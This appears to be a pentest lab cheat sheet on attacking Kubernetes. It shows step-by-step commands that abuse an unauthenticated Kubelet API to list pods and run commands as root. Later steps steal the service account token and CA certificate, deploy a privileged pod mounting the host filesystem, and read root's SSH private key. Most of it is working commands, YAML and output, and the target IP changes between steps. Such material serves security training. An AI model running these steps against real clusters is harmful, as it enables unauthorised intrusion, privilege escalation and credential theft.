# Kubernetes

## K8s Concept


Kubernetes architecture is primarily divided into two types of components:

- The Control Plane (master node), which is responsible for controlling the Kubernetes cluster

Service	TCP Ports
etcd	2379, 2380
API server	6443
Scheduler	10251
Controller Manager	10252
Kubelet API	10250
Read-Only Kubelet API	10255

- The Worker Nodes (minions), where the containerized applications are run

## Kubernetes API

### K8's API Server Interaction

curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}

--> System:anonymous typically represents an unauthenticated user

### Kubelet API - Extracting Pods

curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {

### Kubeletctl - Extracting Pods

kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤

### Kubelet API - Available Commands

kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤

### Kubelet API - Executing Commands

kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)

## Privilege Escalation

### Kubelet API - Extracting Tokens

kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...

### Kubelet API - Extracting Certificates

kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----

### List Privileges

export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Pod YAML :

vi privesc.yaml

apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true

### Creating a new Pod

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s

### Extracting Root's SSH Key

kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...

